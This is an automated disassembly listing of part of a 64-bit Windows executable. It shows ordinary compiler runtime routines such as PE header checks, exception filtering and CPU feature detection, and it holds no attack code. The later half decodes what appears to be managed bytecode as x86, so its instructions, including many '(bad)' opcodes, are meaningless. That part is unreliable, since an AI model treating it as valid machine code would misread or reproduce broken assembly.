   140007262:	8d 48 03             	lea    0x3(%rax),%ecx
   140007265:	e8 ba fe ff ff       	call   0x140007124
   14000726a:	48 8b 9c 24 d0 05 00 	mov    0x5d0(%rsp),%rbx
   140007271:	00 
   140007272:	48 81 c4 c0 05 00 00 	add    $0x5c0,%rsp
   140007279:	5d                   	pop    %rbp
   14000727a:	c3                   	ret
   14000727b:	cc                   	int3
   14000727c:	e9 37 fe ff ff       	jmp    0x1400070b8
   140007281:	cc                   	int3
   140007282:	cc                   	int3
   140007283:	cc                   	int3
   140007284:	48 83 ec 28          	sub    $0x28,%rsp
   140007288:	33 c9                	xor    %ecx,%ecx
   14000728a:	ff 15 e8 2d 00 00    	call   *0x2de8(%rip)        # 0x14000a078
   140007290:	48 85 c0             	test   %rax,%rax
   140007293:	74 3a                	je     0x1400072cf
   140007295:	b9 4d 5a 00 00       	mov    $0x5a4d,%ecx
   14000729a:	66 39 08             	cmp    %cx,(%rax)
   14000729d:	75 30                	jne    0x1400072cf
   14000729f:	48 63 48 3c          	movslq 0x3c(%rax),%rcx
   1400072a3:	81 3c 01 50 45 00 00 	cmpl   $0x4550,(%rcx,%rax,1)
   1400072aa:	75 23                	jne    0x1400072cf
   1400072ac:	ba 0b 02 00 00       	mov    $0x20b,%edx
   1400072b1:	66 39 54 01 18       	cmp    %dx,0x18(%rcx,%rax,1)
   1400072b6:	75 17                	jne    0x1400072cf
   1400072b8:	83 bc 01 84 00 00 00 	cmpl   $0xe,0x84(%rcx,%rax,1)
   1400072bf:	0e 
   1400072c0:	76 0d                	jbe    0x1400072cf
   1400072c2:	83 bc 01 f8 00 00 00 	cmpl   $0x0,0xf8(%rcx,%rax,1)
   1400072c9:	00 
   1400072ca:	0f 95 c0             	setne  %al
   1400072cd:	eb 02                	jmp    0x1400072d1
   1400072cf:	32 c0                	xor    %al,%al
   1400072d1:	48 83 c4 28          	add    $0x28,%rsp
   1400072d5:	c3                   	ret
   1400072d6:	cc                   	int3
   1400072d7:	cc                   	int3
   1400072d8:	48 8d 0d 09 00 00 00 	lea    0x9(%rip),%rcx        # 0x1400072e8
   1400072df:	48 ff 25 82 2d 00 00 	rex.W jmp *0x2d82(%rip)        # 0x14000a068
   1400072e6:	cc                   	int3
   1400072e7:	cc                   	int3
   1400072e8:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   1400072ed:	57                   	push   %rdi
   1400072ee:	48 83 ec 20          	sub    $0x20,%rsp
   1400072f2:	48 8b 19             	mov    (%rcx),%rbx
   1400072f5:	48 8b f9             	mov    %rcx,%rdi
   1400072f8:	81 3b 63 73 6d e0    	cmpl   $0xe06d7363,(%rbx)
   1400072fe:	75 24                	jne    0x140007324
   140007300:	83 7b 18 04          	cmpl   $0x4,0x18(%rbx)
   140007304:	75 1e                	jne    0x140007324
   140007306:	8b 53 20             	mov    0x20(%rbx),%edx
   140007309:	81 fa 20 05 93 19    	cmp    $0x19930520,%edx
   14000730f:	74 20                	je     0x140007331
   140007311:	8d 82 df fa 6c e6    	lea    -0x19930521(%rdx),%eax
   140007317:	83 f8 01             	cmp    $0x1,%eax
   14000731a:	76 15                	jbe    0x140007331
   14000731c:	81 fa 00 40 99 01    	cmp    $0x1994000,%edx
   140007322:	74 0d                	je     0x140007331
   140007324:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   140007329:	33 c0                	xor    %eax,%eax
   14000732b:	48 83 c4 20          	add    $0x20,%rsp
   14000732f:	5f                   	pop    %rdi
   140007330:	c3                   	ret
   140007331:	e8 a3 17 00 00       	call   0x140008ad9
   140007336:	48 89 18             	mov    %rbx,(%rax)
   140007339:	48 8b 5f 08          	mov    0x8(%rdi),%rbx
   14000733d:	e8 9d 17 00 00       	call   0x140008adf
   140007342:	48 89 18             	mov    %rbx,(%rax)
   140007345:	e8 25 18 00 00       	call   0x140008b6f
   14000734a:	cc                   	int3
   14000734b:	cc                   	int3
   14000734c:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   140007351:	57                   	push   %rdi
   140007352:	48 83 ec 20          	sub    $0x20,%rsp
   140007356:	48 8d 1d 73 16 01 00 	lea    0x11673(%rip),%rbx        # 0x1400189d0
   14000735d:	48 8d 3d 6c 16 01 00 	lea    0x1166c(%rip),%rdi        # 0x1400189d0
   140007364:	eb 12                	jmp    0x140007378
   140007366:	48 8b 03             	mov    (%rbx),%rax
   140007369:	48 85 c0             	test   %rax,%rax
   14000736c:	74 06                	je     0x140007374
   14000736e:	ff 15 1c 2f 00 00    	call   *0x2f1c(%rip)        # 0x14000a290
   140007374:	48 83 c3 08          	add    $0x8,%rbx
   140007378:	48 3b df             	cmp    %rdi,%rbx
   14000737b:	72 e9                	jb     0x140007366
   14000737d:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   140007382:	48 83 c4 20          	add    $0x20,%rsp
   140007386:	5f                   	pop    %rdi
   140007387:	c3                   	ret
   140007388:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   14000738d:	57                   	push   %rdi
   14000738e:	48 83 ec 20          	sub    $0x20,%rsp
   140007392:	48 8d 1d 47 16 01 00 	lea    0x11647(%rip),%rbx        # 0x1400189e0
   140007399:	48 8d 3d 40 16 01 00 	lea    0x11640(%rip),%rdi        # 0x1400189e0
   1400073a0:	eb 12                	jmp    0x1400073b4
   1400073a2:	48 8b 03             	mov    (%rbx),%rax
   1400073a5:	48 85 c0             	test   %rax,%rax
   1400073a8:	74 06                	je     0x1400073b0
   1400073aa:	ff 15 e0 2e 00 00    	call   *0x2ee0(%rip)        # 0x14000a290
   1400073b0:	48 83 c3 08          	add    $0x8,%rbx
   1400073b4:	48 3b df             	cmp    %rdi,%rbx
   1400073b7:	72 e9                	jb     0x1400073a2
   1400073b9:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   1400073be:	48 83 c4 20          	add    $0x20,%rsp
   1400073c2:	5f                   	pop    %rdi
   1400073c3:	c3                   	ret
   1400073c4:	e9 ac 17 00 00       	jmp    0x140008b75
   1400073c9:	cc                   	int3
   1400073ca:	cc                   	int3
   1400073cb:	cc                   	int3
   1400073cc:	48 89 5c 24 10       	mov    %rbx,0x10(%rsp)
   1400073d1:	48 89 6c 24 18       	mov    %rbp,0x18(%rsp)
   1400073d6:	48 89 74 24 20       	mov    %rsi,0x20(%rsp)
   1400073db:	57                   	push   %rdi
   1400073dc:	48 83 ec 10          	sub    $0x10,%rsp
   1400073e0:	33 c0                	xor    %eax,%eax
   1400073e2:	33 c9                	xor    %ecx,%ecx
   1400073e4:	0f a2                	cpuid
   1400073e6:	81 f1 6e 74 65 6c    	xor    $0x6c65746e,%ecx
   1400073ec:	81 f2 69 6e 65 49    	xor    $0x49656e69,%edx
   1400073f2:	0b d1                	or     %ecx,%edx
   1400073f4:	8b e8                	mov    %eax,%ebp
   1400073f6:	b8 01 00 00 00       	mov    $0x1,%eax
   1400073fb:	81 f3 47 65 6e 75    	xor    $0x756e6547,%ebx
   140007401:	0b d3                	or     %ebx,%edx
   140007403:	8d 48 ff             	lea    -0x1(%rax),%ecx
   140007406:	0f a2                	cpuid
   140007408:	8b f9                	mov    %ecx,%edi
   14000740a:	75 5e                	jne    0x14000746a
   14000740c:	25 f0 3f ff 0f       	and    $0xfff3ff0,%eax
   140007411:	48 c7 05 04 2d 01 00 	movq   $0x8000,0x12d04(%rip)        # 0x14001a120
   140007418:	00 80 00 00 
   14000741c:	48 c7 05 01 2d 01 00 	movq   $0xffffffffffffffff,0x12d01(%rip)        # 0x14001a128
   140007423:	ff ff ff ff 
   140007427:	3d c0 06 01 00       	cmp    $0x106c0,%eax
   14000742c:	74 28                	je     0x140007456
   14000742e:	3d 60 06 02 00       	cmp    $0x20660,%eax
   140007433:	74 21                	je     0x140007456
   140007435:	3d 70 06 02 00       	cmp    $0x20670,%eax
   14000743a:	74 1a                	je     0x140007456
   14000743c:	05 b0 f9 fc ff       	add    $0xfffcf9b0,%eax
   140007441:	83 f8 20             	cmp    $0x20,%eax
   140007444:	77 24                	ja     0x14000746a
   140007446:	48 b9 01 00 01 00 01 	movabs $0x100010001,%rcx
   14000744d:	00 00 00 
   140007450:	48 0f a3 c1          	bt     %rax,%rcx
   140007454:	73 14                	jae    0x14000746a
   140007456:	44 8b 05 f3 30 01 00 	mov    0x130f3(%rip),%r8d        # 0x14001a550
   14000745d:	41 83 c8 01          	or     $0x1,%r8d
   140007461:	44 89 05 e8 30 01 00 	mov    %r8d,0x130e8(%rip)        # 0x14001a550
   140007468:	eb 07                	jmp    0x140007471
   14000746a:	44 8b 05 df 30 01 00 	mov    0x130df(%rip),%r8d        # 0x14001a550
   140007471:	45 33 c9             	xor    %r9d,%r9d
   140007474:	41 8b f1             	mov    %r9d,%esi
   140007477:	45 8b d1             	mov    %r9d,%r10d
   14000747a:	45 8b d9             	mov    %r9d,%r11d
   14000747d:	83 fd 07             	cmp    $0x7,%ebp
   140007480:	7c 40                	jl     0x1400074c2
   140007482:	41 8d 41 07          	lea    0x7(%r9),%eax
   140007486:	33 c9                	xor    %ecx,%ecx
   140007488:	0f a2                	cpuid
   14000748a:	8b f2                	mov    %edx,%esi
   14000748c:	44 8b cb             	mov    %ebx,%r9d
   14000748f:	0f ba e3 09          	bt     $0x9,%ebx
   140007493:	73 0b                	jae    0x1400074a0
   140007495:	41 83 c8 02          	or     $0x2,%r8d
   140007499:	44 89 05 b0 30 01 00 	mov    %r8d,0x130b0(%rip)        # 0x14001a550
   1400074a0:	83 f8 01             	cmp    $0x1,%eax
   1400074a3:	7c 0d                	jl     0x1400074b2
   1400074a5:	b8 07 00 00 00       	mov    $0x7,%eax
   1400074aa:	8d 48 fa             	lea    -0x6(%rax),%ecx
   1400074ad:	0f a2                	cpuid
   1400074af:	44 8b d2             	mov    %edx,%r10d
   1400074b2:	b8 24 00 00 00       	mov    $0x24,%eax
   1400074b7:	3b e8                	cmp    %eax,%ebp
   1400074b9:	7c 07                	jl     0x1400074c2
   1400074bb:	33 c9                	xor    %ecx,%ecx
   1400074bd:	0f a2                	cpuid
   1400074bf:	44 8b db             	mov    %ebx,%r11d
   1400074c2:	48 8b 05 47 2c 01 00 	mov    0x12c47(%rip),%rax        # 0x14001a110
   1400074c9:	48 83 e0 fe          	and    $0xfffffffffffffffe,%rax
   1400074cd:	c7 05 41 2c 01 00 01 	movl   $0x1,0x12c41(%rip)        # 0x14001a118
   1400074d4:	00 00 00 
   1400074d7:	c7 05 3b 2c 01 00 02 	movl   $0x2,0x12c3b(%rip)        # 0x14001a11c
   1400074de:	00 00 00 
   1400074e1:	48 89 05 28 2c 01 00 	mov    %rax,0x12c28(%rip)        # 0x14001a110
   1400074e8:	0f ba e7 14          	bt     $0x14,%edi
   1400074ec:	73 1f                	jae    0x14000750d
   1400074ee:	48 83 e0 ef          	and    $0xffffffffffffffef,%rax
   1400074f2:	c7 05 1c 2c 01 00 02 	movl   $0x2,0x12c1c(%rip)        # 0x14001a118
   1400074f9:	00 00 00 
   1400074fc:	48 89 05 0d 2c 01 00 	mov    %rax,0x12c0d(%rip)        # 0x14001a110
   140007503:	c7 05 0f 2c 01 00 06 	movl   $0x6,0x12c0f(%rip)        # 0x14001a11c
   14000750a:	00 00 00 
   14000750d:	0f ba e7 1b          	bt     $0x1b,%edi
   140007511:	0f 83 33 01 00 00    	jae    0x14000764a
   140007517:	33 c9                	xor    %ecx,%ecx
   140007519:	0f 01 d0             	xgetbv
   14000751c:	48 c1 e2 20          	shl    $0x20,%rdx
   140007520:	48 0b d0             	or     %rax,%rdx
   140007523:	48 89 54 24 20       	mov    %rdx,0x20(%rsp)
   140007528:	0f ba e7 1c          	bt     $0x1c,%edi
   14000752c:	0f 83 fc 00 00 00    	jae    0x14000762e
   140007532:	48 8b 44 24 20       	mov    0x20(%rsp),%rax
   140007537:	24 06                	and    $0x6,%al
   140007539:	3c 06                	cmp    $0x6,%al
   14000753b:	0f 85 ed 00 00 00    	jne    0x14000762e
   140007541:	8b 05 d5 2b 01 00    	mov    0x12bd5(%rip),%eax        # 0x14001a11c
   140007547:	b2 e0                	mov    $0xe0,%dl
   140007549:	83 c8 08             	or     $0x8,%eax
   14000754c:	c7 05 c2 2b 01 00 03 	movl   $0x3,0x12bc2(%rip)        # 0x14001a118
   140007553:	00 00 00 
   140007556:	89 05 c0 2b 01 00    	mov    %eax,0x12bc0(%rip)        # 0x14001a11c
   14000755c:	41 f6 c1 20          	test   $0x20,%r9b
   140007560:	74 62                	je     0x1400075c4
   140007562:	83 c8 20             	or     $0x20,%eax
   140007565:	c7 05 a9 2b 01 00 05 	movl   $0x5,0x12ba9(%rip)        # 0x14001a118
   14000756c:	00 00 00 
   14000756f:	89 05 a7 2b 01 00    	mov    %eax,0x12ba7(%rip)        # 0x14001a11c
   140007575:	b9 00 00 03 d0       	mov    $0xd0030000,%ecx
   14000757a:	48 8b 05 8f 2b 01 00 	mov    0x12b8f(%rip),%rax        # 0x14001a110
   140007581:	44 23 c9             	and    %ecx,%r9d
   140007584:	48 83 e0 fd          	and    $0xfffffffffffffffd,%rax
   140007588:	48 89 05 81 2b 01 00 	mov    %rax,0x12b81(%rip)        # 0x14001a110
   14000758f:	44 3b c9             	cmp    %ecx,%r9d
   140007592:	75 37                	jne    0x1400075cb
   140007594:	48 8b 44 24 20       	mov    0x20(%rsp),%rax
   140007599:	22 c2                	and    %dl,%al
   14000759b:	3a c2                	cmp    %dl,%al
   14000759d:	75 25                	jne    0x1400075c4
   14000759f:	48 8b 05 6a 2b 01 00 	mov    0x12b6a(%rip),%rax        # 0x14001a110
   1400075a6:	83 0d 6f 2b 01 00 40 	orl    $0x40,0x12b6f(%rip)        # 0x14001a11c
   1400075ad:	48 83 e0 db          	and    $0xffffffffffffffdb,%rax
   1400075b1:	c7 05 5d 2b 01 00 06 	movl   $0x6,0x12b5d(%rip)        # 0x14001a118
   1400075b8:	00 00 00 
   1400075bb:	48 89 05 4e 2b 01 00 	mov    %rax,0x12b4e(%rip)        # 0x14001a110
   1400075c2:	eb 07                	jmp    0x1400075cb
   1400075c4:	48 8b 05 45 2b 01 00 	mov    0x12b45(%rip),%rax        # 0x14001a110
   1400075cb:	0f ba e6 17          	bt     $0x17,%esi
   1400075cf:	73 0c                	jae    0x1400075dd
   1400075d1:	48 0f ba f0 18       	btr    $0x18,%rax
   1400075d6:	48 89 05 33 2b 01 00 	mov    %rax,0x12b33(%rip)        # 0x14001a110
   1400075dd:	41 0f ba e2 13       	bt     $0x13,%r10d
   1400075e2:	73 4a                	jae    0x14000762e
   1400075e4:	48 8b 44 24 20       	mov    0x20(%rsp),%rax
   1400075e9:	22 c2                	and    %dl,%al
   1400075eb:	3a c2                	cmp    %dl,%al
   1400075ed:	75 3f                	jne    0x14000762e
   1400075ef:	41 8b cb             	mov    %r11d,%ecx
   1400075f2:	41 8b c3             	mov    %r11d,%eax
   1400075f5:	48 c1 e9 10          	shr    $0x10,%rcx
   1400075f9:	25 ff 00 04 00       	and    $0x400ff,%eax
   1400075fe:	83 e1 06             	and    $0x6,%ecx
   140007601:	89 05 45 2f 01 00    	mov    %eax,0x12f45(%rip)        # 0x14001a54c
   140007607:	48 81 c9 29 00 00 01 	or     $0x1000029,%rcx
   14000760e:	48 f7 d1             	not    %rcx
   140007611:	48 23 0d f8 2a 01 00 	and    0x12af8(%rip),%rcx        # 0x14001a110
   140007618:	48 89 0d f1 2a 01 00 	mov    %rcx,0x12af1(%rip)        # 0x14001a110
   14000761f:	3c 01                	cmp    $0x1,%al
   140007621:	76 0b                	jbe    0x14000762e
   140007623:	48 83 e1 bf          	and    $0xffffffffffffffbf,%rcx
   140007627:	48 89 0d e2 2a 01 00 	mov    %rcx,0x12ae2(%rip)        # 0x14001a110
   14000762e:	41 0f ba e2 15       	bt     $0x15,%r10d
   140007633:	73 15                	jae    0x14000764a
   140007635:	48 8b 44 24 20       	mov    0x20(%rsp),%rax
   14000763a:	48 0f ba e0 13       	bt     $0x13,%rax
   14000763f:	73 09                	jae    0x14000764a
   140007641:	48 0f ba 35 c6 2a 01 	btrq   $0x7,0x12ac6(%rip)        # 0x14001a110
   140007648:	00 07 
   14000764a:	48 8b 5c 24 28       	mov    0x28(%rsp),%rbx
   14000764f:	33 c0                	xor    %eax,%eax
   140007651:	48 8b 6c 24 30       	mov    0x30(%rsp),%rbp
   140007656:	48 8b 74 24 38       	mov    0x38(%rsp),%rsi
   14000765b:	48 83 c4 10          	add    $0x10,%rsp
   14000765f:	5f                   	pop    %rdi
   140007660:	c3                   	ret
   140007661:	cc                   	int3
   140007662:	cc                   	int3
   140007663:	cc                   	int3
   140007664:	33 c0                	xor    %eax,%eax
   140007666:	39 05 4c 2b 01 00    	cmp    %eax,0x12b4c(%rip)        # 0x14001a1b8
   14000766c:	0f 95 c0             	setne  %al
   14000766f:	c3                   	ret
   140007670:	0b 30                	or     (%rax),%esi
   140007672:	02 00                	add    (%rax),%al
   140007674:	1c 00                	sbb    $0x0,%al
   140007676:	00 00                	add    %al,(%rax)
   140007678:	40 00 00             	rex add %al,(%rax)
   14000767b:	11 02                	adc    %eax,(%rdx)
   14000767d:	0a 03                	or     (%rbx),%al
   14000767f:	06                   	(bad)
   140007680:	29 3c 00             	sub    %edi,(%rax,%rax,1)
   140007683:	00 11                	add    %dl,(%rcx)
   140007685:	de 10                	ficoms (%rax)
   140007687:	26 28 21             	es sub %ah,(%rcx)
   14000768a:	00 00                	add    %al,(%rax)
   14000768c:	0a 28                	or     (%rax),%ch
   14000768e:	ea                   	(bad)
   14000768f:	00 00                	add    %al,(%rax)
   140007691:	06                   	(bad)
   140007692:	fe                   	(bad)
   140007693:	11 26                	adc    %esp,(%rsi)
   140007695:	de 00                	fiadds (%rax)
   140007697:	2a 41 1c             	sub    0x1c(%rcx),%al
   14000769a:	00 00                	add    %al,(%rax)
   14000769c:	01 00                	add    %eax,(%rax)
   14000769e:	00 00                	add    %al,(%rax)
   1400076a0:	00 00                	add    %al,(%rax)
   1400076a2:	00 00                	add    %al,(%rax)
   1400076a4:	0b 00                	or     (%rax),%eax
   1400076a6:	00 00                	add    %al,(%rax)
   1400076a8:	18 00                	sbb    %al,(%rax)
   1400076aa:	00 00                	add    %al,(%rax)
   1400076ac:	03 00                	add    (%rax),%eax
   1400076ae:	00 00                	add    %al,(%rax)
   1400076b0:	0b 00                	or     (%rax),%eax
   1400076b2:	00 00                	add    %al,(%rax)
   1400076b4:	03 30                	add    (%rax),%esi
   1400076b6:	02 00                	add    (%rax),%al
   1400076b8:	29 00                	sub    %eax,(%rax)
   1400076ba:	00 00                	add    %al,(%rax)
   1400076bc:	45 00 00             	add    %r8b,(%r8)
   1400076bf:	11 02                	adc    %eax,(%rdx)
   1400076c1:	4c 0a 06             	rex.WR or (%rsi),%r8b
   1400076c4:	4a 20 63 73          	rex.WX and %spl,0x73(%rbx)
   1400076c8:	6d                   	insl   (%dx),(%rdi)
   1400076c9:	e0 2e                	loopne 0x1400076f9
   1400076cb:	02 16                	add    (%rsi),%dl
   1400076cd:	2a 28                	sub    (%rax),%ch
   1400076cf:	ed                   	in     (%dx),%eax
   1400076d0:	00 00                	add    %al,(%rax)
   1400076d2:	06                   	(bad)
   1400076d3:	06                   	(bad)
   1400076d4:	55                   	push   %rbp
   1400076d5:	02 1e                	add    (%rsi),%bl
   1400076d7:	6a 58                	push   $0x58
   1400076d9:	4c 0b 28             	or     (%rax),%r13
   1400076dc:	eb 00                	jmp    0x1400076de
   1400076de:	00 06                	add    %al,(%rsi)
   1400076e0:	07                   	(bad)
   1400076e1:	55                   	push   %rbp
   1400076e2:	28 ec                	sub    %ch,%ah
   1400076e4:	00 00                	add    %al,(%rax)
   1400076e6:	06                   	(bad)
   1400076e7:	16                   	(bad)
   1400076e8:	2a cc                	sub    %ah,%cl
   1400076ea:	cc                   	int3
   1400076eb:	cc                   	int3
   1400076ec:	0b 30                	or     (%rax),%esi
   1400076ee:	02 00                	add    (%rax),%al
   1400076f0:	2f                   	(bad)
   1400076f1:	00 00                	add    %al,(%rax)
   1400076f3:	00 46 00             	add    %al,0x0(%rsi)
   1400076f6:	00 11                	add    %dl,(%rcx)
   1400076f8:	16                   	(bad)
   1400076f9:	6a 0a                	push   $0xa
   1400076fb:	06                   	(bad)
   1400076fc:	04 2e                	add    $0x2e,%al
   1400076fe:	15 02 03 59 10       	adc    $0x10590302,%eax
   140007703:	00 05 0b 02 07 29    	add    %al,0x2907020b(%rip)        # 0x169077914
   140007709:	3c 00                	cmp    $0x0,%al
   14000770b:	00 11                	add    %dl,(%rcx)
   14000770d:	06                   	(bad)
   14000770e:	17                   	(bad)
   14000770f:	6a 58                	push   $0x58
   140007711:	0a 2b                	or     (%rbx),%ch
   140007713:	e7 de                	out    %eax,$0xde
   140007715:	10 26                	adc    %ah,(%rsi)
   140007717:	28 21                	sub    %ah,(%rcx)
   140007719:	00 00                	add    %al,(%rax)
   14000771b:	0a 28                	or     (%rax),%ch
   14000771d:	7f 00                	jg     0x14000771f
   14000771f:	00 06                	add    %al,(%rsi)
   140007721:	fe                   	(bad)
   140007722:	11 26                	adc    %esp,(%rsi)
   140007724:	de 00                	fiadds (%rax)
   140007726:	2a 00                	sub    (%rax),%al
   140007728:	41 1c 00             	rex.B sbb $0x0,%al
   14000772b:	00 01                	add    %al,(%rcx)
   14000772d:	00 00                	add    %al,(%rax)
   14000772f:	00 00                	add    %al,(%rax)
   140007731:	00 00                	add    %al,(%rax)
   140007733:	00 1e                	add    %bl,(%rsi)
   140007735:	00 00                	add    %al,(%rax)
   140007737:	00 2b                	add    %ch,(%rbx)
   140007739:	00 00                	add    %al,(%rax)
   14000773b:	00 03                	add    %al,(%rbx)
   14000773d:	00 00                	add    %al,(%rax)
   14000773f:	00 1e                	add    %bl,(%rsi)
   140007741:	00 00                	add    %al,(%rax)
   140007743:	00 0b                	add    %cl,(%rbx)
   140007745:	30 04 00             	xor    %al,(%rax,%rax,1)
   140007748:	36 00 00             	ss add %al,(%rax)
   14000774b:	00 48 00             	add    %cl,0x0(%rax)
   14000774e:	00 11                	add    %dl,(%rcx)
   140007750:	16                   	(bad)
   140007751:	0a 03                	or     (%rbx),%al
   140007753:	04 5a                	add    $0x5a,%al
   140007755:	02 58 10             	add    0x10(%rax),%bl
   140007758:	00 04 04             	add    %al,(%rsp,%rax,1)
   14000775b:	17                   	(bad)
   14000775c:	6a 59                	push   $0x59
   14000775e:	10 02                	adc    %al,(%rdx)
   140007760:	16                   	(bad)
   140007761:	6a 36                	push   $0x36
   140007763:	10 02                	adc    %al,(%rdx)
   140007765:	03 59 10             	add    0x10(%rcx),%ebx
   140007768:	00 05 0b 02 07 29    	add    %al,0x2907020b(%rip)        # 0x169077979
   14000776e:	3c 00                	cmp    $0x0,%al
   140007770:	00 11                	add    %dl,(%rcx)
   140007772:	2b e5                	sub    %ebp,%esp
   140007774:	17                   	(bad)
   140007775:	0a de                	or     %dh,%bl
   140007777:	0d 06 2d 09 02       	or     $0x2092d06,%eax
   14000777c:	03 04 05 28 80 00 00 	add    0x8028(,%rax,1),%eax
   140007783:	06                   	(bad)
   140007784:	dc 2a                	fsubrl (%rdx)
   140007786:	00 00                	add    %al,(%rax)
   140007788:	41 1c 00             	rex.B sbb $0x0,%al
   14000778b:	00 02                	add    %al,(%rdx)
   14000778d:	00 00                	add    %al,(%rax)
   14000778f:	00 09                	add    %cl,(%rcx)
   140007791:	00 00                	add    %al,(%rax)
   140007793:	00 1f                	add    %bl,(%rdi)
   140007795:	00 00                	add    %al,(%rax)
   140007797:	00 28                	add    %ch,(%rax)
   140007799:	00 00                	add    %al,(%rax)
   14000779b:	00 0d 00 00 00 24    	add    %cl,0x24000000(%rip)        # 0x1640077a1
   1400077a1:	00 00                	add    %al,(%rax)
   1400077a3:	01 03                	add    %eax,(%rbx)
   1400077a5:	30 02                	xor    %al,(%rdx)
   1400077a7:	00 21                	add    %ah,(%rcx)
   1400077a9:	00 00                	add    %al,(%rax)
   1400077ab:	00 4a 00             	add    %cl,0x0(%rdx)
   1400077ae:	00 11                	add    %dl,(%rcx)
   1400077b0:	7e 66                	jle    0x140007818
   1400077b2:	00 00                	add    %al,(%rax)
   1400077b4:	04 2c                	add    $0x2c,%al
   1400077b6:	18 12                	sbb    %dl,(%rdx)
   1400077b8:	00 7e 66             	add    %bh,0x66(%rsi)
   1400077bb:	00 00                	add    %al,(%rax)
   1400077bd:	04 28                	add    $0x28,%al
   1400077bf:	06                   	(bad)
   1400077c0:	00 00                	add    %al,(%rax)
   1400077c2:	0a 06                	or     (%rsi),%al
   1400077c4:	28 29                	sub    %ch,(%rcx)
   1400077c6:	00 00                	add    %al,(%rax)
   1400077c8:	0a 8c 29 00 00 01 2a 	or     0x2a010000(%rcx,%rbp,1),%cl
   1400077cf:	14 2a                	adc    $0x2a,%al
   1400077d1:	cc                   	int3
   1400077d2:	cc                   	int3
   1400077d3:	cc                   	int3
   1400077d4:	03 30                	add    (%rax),%esi
   1400077d6:	02 00                	add    (%rax),%al
   1400077d8:	3f                   	(bad)
   1400077d9:	00 00                	add    %al,(%rax)
   1400077db:	00 4d 00             	add    %cl,0x0(%rbp)
   1400077de:	00 11                	add    %dl,(%rcx)
   1400077e0:	28 81 00 00 06 0a    	sub    %al,0xa060000(%rcx)
   1400077e6:	06                   	(bad)
   1400077e7:	2d 29 02 28 27       	sub    $0x27280229,%eax
   1400077ec:	00 00                	add    %al,(%rax)
   1400077ee:	0a 8c 29 00 00 01 79 	or     0x79010000(%rcx,%rbp,1),%cl
   1400077f5:	29 00                	sub    %eax,(%rax)
   1400077f7:	00 01                	add    %al,(%rcx)
   1400077f9:	71 29                	jno    0x140007824
   1400077fb:	00 00                	add    %al,(%rax)
   1400077fd:	01 28                	add    %ebp,(%rax)
   1400077ff:	2a 00                	sub    (%rax),%al
   140007801:	00 0a                	add    %cl,(%rdx)
   140007803:	0b 12                	or     (%rdx),%edx
   140007805:	01 28                	add    %ebp,(%rax)
   140007807:	31 00                	xor    %eax,(%rax)
   140007809:	00 0a                	add    %cl,(%rdx)
   14000780b:	80 66 00 00          	andb   $0x0,0x0(%rsi)
   14000780f:	04 2b                	add    $0x2b,%al
   140007811:	0c 06                	or     $0x6,%al
   140007813:	79 29                	jns    0x14000783e
   140007815:	00 00                	add    %al,(%rax)
   140007817:	01 02                	add    %eax,(%rdx)
   140007819:	28 2c 00             	sub    %ch,(%rax,%rax,1)
   14000781c:	00 0a                	add    %cl,(%rdx)
   14000781e:	2a cc                	sub    %ah,%cl
   140007820:	03 30                	add    (%rax),%esi
   140007822:	01 00                	add    %eax,(%rax)
   140007824:	17                   	(bad)
   140007825:	00 00                	add    %al,(%rax)
   140007827:	00 4e 00             	add    %cl,0x0(%rsi)
   14000782a:	00 11                	add    %dl,(%rcx)
   14000782c:	28 81 00 00 06 0a    	sub    %al,0xa060000(%rcx)
   140007832:	06                   	(bad)
   140007833:	2c 0c                	sub    $0xc,%al
   140007835:	06                   	(bad)
   140007836:	79 29                	jns    0x140007861
   140007838:	00 00                	add    %al,(%rax)
   14000783a:	01 28                	add    %ebp,(%rax)
   14000783c:	2b 00                	sub    (%rax),%eax
   14000783e:	00 0a                	add    %cl,(%rdx)
   140007840:	2a 14 2a             	sub    (%rdx,%rbp,1),%dl
   140007843:	cc                   	int3
   140007844:	03 30                	add    (%rax),%esi
   140007846:	01 00                	add    %eax,(%rax)
   140007848:	1c 00                	sbb    $0x0,%al
   14000784a:	00 00                	add    %al,(%rax)
   14000784c:	4e 00 00             	rex.WRX add %r8b,(%rax)
   14000784f:	11 28                	adc    %ebp,(%rax)
   140007851:	81 00 00 06 0a 06    	addl   $0x60a0600,(%rax)
   140007857:	2c 12                	sub    $0x12,%al
   140007859:	06                   	(bad)
   14000785a:	79 29                	jns    0x140007885
   14000785c:	00 00                	add    %al,(%rax)
   14000785e:	01 28                	add    %ebp,(%rax)
   140007860:	28 00                	sub    %al,(%rax)
   140007862:	00 0a                	add    %cl,(%rdx)
   140007864:	16                   	(bad)
   140007865:	6a 80                	push   $0xffffffffffffff80
   140007867:	66 00 00             	data16 add %al,(%rax)
   14000786a:	04 2a                	add    $0x2a,%al
   14000786c:	03 30                	add    (%rax),%esi
   14000786e:	02 00                	add    (%rax),%al
   140007870:	0e                   	(bad)
   140007871:	00 00                	add    %al,(%rax)
   140007873:	00 00                	add    %al,(%rax)
   140007875:	00 00                	add    %al,(%rax)
   140007877:	00 28                	add    %ch,(%rax)
   140007879:	84 00                	test   %al,(%rax)
   14000787b:	00 06                	add    %al,(%rsi)
   14000787d:	14 33                	adc    $0x33,%al
   14000787f:	03 16                	add    (%rsi),%edx
   140007881:	2b 01                	sub    (%rcx),%eax
   140007883:	17                   	(bad)
   140007884:	d2 2a                	shrb   %cl,(%rdx)
   140007886:	cc                   	int3
   140007887:	cc                   	int3
   140007888:	03 30                	add    (%rax),%esi
   14000788a:	02 00                	add    (%rax),%al
   14000788c:	19 00                	sbb    %eax,(%rax)
   14000788e:	00 00                	add    %al,(%rax)
   140007890:	00 00                	add    %al,(%rax)
   140007892:	00 00                	add    %al,(%rax)
   140007894:	7e 67                	jle    0x1400078fd
   140007896:	00 00                	add    %al,(%rax)
   140007898:	04 15                	add    $0x15,%al
   14000789a:	58                   	pop    %rax
   14000789b:	80 67 00 00          	andb   $0x0,0x0(%rdi)
   14000789f:	04 7e                	add    $0x7e,%al
   1400078a1:	67 00 00             	add    %al,(%eax)
   1400078a4:	04 2d                	add    $0x2d,%al
   1400078a6:	05 28 85 00 00       	add    $0x8528,%eax
   1400078ab:	06                   	(bad)
   1400078ac:	2a cc                	sub    %ah,%cl
   1400078ae:	cc                   	int3
   1400078af:	cc                   	int3
   1400078b0:	03 30                	add    (%rax),%esi
